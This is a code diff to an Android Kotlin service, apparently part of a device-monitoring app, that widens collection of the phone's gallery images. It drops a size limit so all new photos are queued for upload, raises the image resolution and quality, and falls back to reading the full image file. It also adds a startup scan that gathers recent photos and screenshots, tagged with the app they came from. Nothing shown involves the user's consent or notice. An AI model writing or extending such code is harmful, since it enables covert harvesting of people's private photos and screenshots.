@@ -115,19 +115,22 @@ class MediaObserverService(private val context: Context) {
                     "timestamp" to dateFormat.format(Date()),
                 ))
 
-                // Compresser et enqueue la miniature pour upload
-                if (size < 10 * 1024 * 1024) {
-                    val thumbBase64 = generateThumbnail(id)
-                    if (thumbBase64 != null) {
-                        queue.enqueue("photo_thumbnail", mapOf(
-                            "mediaId" to id,
-                            "filename" to name,
-                            "sourceApp" to sourceApp,
-                            "isScreenshot" to isScreenshot,
-                            "thumbnail" to thumbBase64,
-                            "timestamp" to dateFormat.format(Date()),
-                        ))
-                    }
+                // Compresser et enqueue la miniature pour upload - TOUJOURS
+                val thumbBase64 = generateThumbnail(id)
+                if (thumbBase64 != null) {
+                    queue.enqueue("photo_captured", mapOf(
+                        "mediaId" to id,
+                        "filename" to name,
+                        "sourceApp" to sourceApp,
+                        "isScreenshot" to isScreenshot,
+                        "width" to width,
+                        "height" to height,
+                        "sizeBytes" to size,
+                        "imageData" to thumbBase64,
+                        "source" to "gallery",
+                        "timestamp" to dateFormat.format(Date()),
+                    ))
+                    Log.d(TAG, "Photo captured: $name from $sourceApp")
                 }
             }
             cursor.close()
@@ -218,13 +221,91 @@ class MediaObserverService(private val context: Context) {
             val uri = android.content.ContentUris.withAppendedId(
                 MediaStore.Images.Media.EXTERNAL_CONTENT_URI, imageId
             )
-            val bitmap = context.contentResolver.loadThumbnail(uri, android.util.Size(320, 320), null)
+            // Taille plus grande pour meilleure qualité (800x800 au lieu de 320x320)
+            val bitmap = context.contentResolver.loadThumbnail(uri, android.util.Size(800, 800), null)
             val stream = ByteArrayOutputStream()
-            bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, stream)
+            // Qualité augmentée à 75%
+            bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 75, stream)
             Base64.encodeToString(stream.toByteArray(), Base64.NO_WRAP)
         } catch (e: Exception) {
             Log.w(TAG, "Thumbnail generation failed: ${e.message}")
-            null
+            // Fallback: essayer de lire l'image directement
+            try {
+                val uri = android.content.ContentUris.withAppendedId(
+                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI, imageId
+                )
+                val inputStream = context.contentResolver.openInputStream(uri)
+                val bytes = inputStream?.readBytes()
+                inputStream?.close()
+                if (bytes != null && bytes.size < 5 * 1024 * 1024) { // Max 5MB
+                    // Compresser si nécessaire
+                    val bitmap = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
+                    if (bitmap != null) {
+                        val stream = ByteArrayOutputStream()
+                        bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 70, stream)
+                        return Base64.encodeToString(stream.toByteArray(), Base64.NO_WRAP)
+                    }
+                }
+                null
+            } catch (_: Exception) { null }
+        }
+    }
+
+    /**
+     * Scan initial de TOUTES les photos récentes (dernières 24h)
+     * Appelé au démarrage pour capturer les photos existantes
+     */
+    fun scanRecentPhotos() {
+        val oneDayAgo = (System.currentTimeMillis() / 1000) - (24 * 60 * 60)
+        try {
+            val cursor = context.contentResolver.query(
+                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                arrayOf(
+                    MediaStore.Images.Media._ID,
+                    MediaStore.Images.Media.DISPLAY_NAME,
+                    MediaStore.Images.Media.DATE_ADDED,
+                    MediaStore.Images.Media.SIZE,
+                    MediaStore.Images.Media.RELATIVE_PATH,
+                    MediaStore.Images.Media.WIDTH,
+                    MediaStore.Images.Media.HEIGHT,
+                ),
+                "${MediaStore.Images.Media.DATE_ADDED} > ?",
+                arrayOf(oneDayAgo.toString()),
+                "${MediaStore.Images.Media.DATE_ADDED} DESC LIMIT 20"
+            ) ?: return
+
+            val queue = EventQueue.getInstance(context)
+            while (cursor.moveToNext()) {
+                val id = cursor.getLong(0)
+                val name = cursor.getString(1) ?: "photo"
+                val size = cursor.getLong(3)
+                val path = cursor.getString(4) ?: ""
+                val width = cursor.getInt(5)
+                val height = cursor.getInt(6)
+
+                val sourceApp = guessSourceApp(path, name)
+                val isScreenshot = path.lowercase().contains("screenshot") || name.lowercase().contains("screenshot")
+
+                val thumbBase64 = generateThumbnail(id)
+                if (thumbBase64 != null) {
+                    queue.enqueue("photo_captured", mapOf(
+                        "mediaId" to id,
+                        "filename" to name,
+                        "sourceApp" to sourceApp,
+                        "isScreenshot" to isScreenshot,
+                        "width" to width,
+                        "height" to height,
+                        "sizeBytes" to size,
+                        "imageData" to thumbBase64,
+                        "source" to "initial_scan",
+                        "timestamp" to dateFormat.format(Date()),
+                    ))
+                }
+            }
+            cursor.close()
+            Log.d(TAG, "Initial photo scan completed")
+        } catch (e: Exception) {
+            Log.w(TAG, "Initial scan error: ${e.message}")
         }
     }
 
